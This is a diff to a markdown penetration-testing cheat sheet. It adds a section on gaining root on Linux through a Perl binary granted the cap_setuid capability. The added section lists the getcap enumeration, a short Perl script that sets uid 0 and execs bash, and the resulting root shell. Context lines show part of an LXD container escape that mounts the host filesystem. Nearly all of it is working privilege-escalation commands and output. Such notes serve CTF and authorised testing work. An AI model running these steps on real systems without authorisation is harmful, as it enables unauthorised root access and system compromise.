@@ -35,7 +35,7 @@
 
 ### Linux Privesc
   - [LXC/LXD container](#lxclxd-privilege-escalation)
-
+  - [Perl setuid capability](#perl-setuid-capability-privesc)
 -------------------------------------------------------------------------------------------------------------
 # Bypass File Upload Filtering
 
@@ -527,4 +527,30 @@ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=tru
 lxc start ignite
 lxc exec ignite /bin/sh
 id
+```
+
+# Perl setuid capability privesc
+
+* if the `perl` has the `cap_setuid+ep` permission set.
+* then it means `perl` has capability set permission.
+```shell
+akrech@akr3ch:/tmp$ getcap -r / 2>/dev/null
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+* create a perl file
+```perl
+akrech@akr3ch:/tmp$ cat root.pl
+#!/usr/bin/perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/bash";
+```
+```
+akrech@akr3ch:/tmp$ ./root.pl
+root@akr3ch:/tmp# id
+uid=0(root) gid=1000(akrech) groups=1000(akrech)
 ```
